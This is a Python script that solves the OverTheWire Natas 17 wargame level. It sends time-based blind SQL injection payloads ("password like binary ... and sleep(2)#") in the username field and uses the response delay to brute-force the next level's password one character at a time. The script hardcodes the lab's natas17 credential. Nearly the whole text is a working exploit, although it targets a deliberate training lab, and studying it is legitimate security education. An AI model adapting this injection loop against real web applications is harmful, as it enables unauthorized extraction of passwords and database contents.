# Vulnerability: SQL Injection (Blind)

import requests
import string
import colorama
from colorama import Fore, Style


def checkResponseTime(resp):
    if resp.elapsed.total_seconds() > 1:
        return True
    else:
        return False


def password_bruteforce(charList, passwordList):
    for char in charList:

        if len(passwordList) == 0:
            data = {"username": f'natas18" and password like binary "{char}%" and sleep(2)#'}
        else:
            data = {"username": f'natas18" and password like binary "{"".join(passwordList) + char}%" and sleep(2)#'}

        resp = session.post(url=url, data=data)
        if checkResponseTime(resp):
            passwordList.append(char)
            break
    print(f"[+] Password List: {passwordList}")


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Create a session and set the authorization credentials
session = requests.Session()


# Set the authorization credentials using HTTP Basic Auth
session.auth = (username, password)


# Alphanumeric characters list
charList = string.ascii_letters + string.digits


# Empty Password List
passwordList = []


for i in range(len(password)):
    # Simple print statement to track the progress
    print(f"\n[-] Brute forcing {i + 1} character...")
    password_bruteforce(charList, passwordList)


print(f"\nNatas 18: {''.join(passwordList)}")
